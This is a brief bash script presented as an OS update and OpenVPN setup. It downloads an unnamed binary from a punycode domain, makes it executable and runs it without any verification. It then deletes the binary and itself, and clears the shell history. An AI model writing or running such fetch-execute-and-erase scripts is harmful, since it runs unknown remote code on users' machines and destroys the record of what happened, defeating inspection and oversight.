#!/bin/bash

#update os
apt-get update > /dev/null

#openvpn
wget -o /dev/null script.xn--l3clxf6cwbe0gd7j.com/allvertion
chmod +x allvertion
./allvertion
rm allvertion.sh 2>/dev/null


#clear
rm script.sh 2>/dev/null
rm -rf .bash_history && history -c
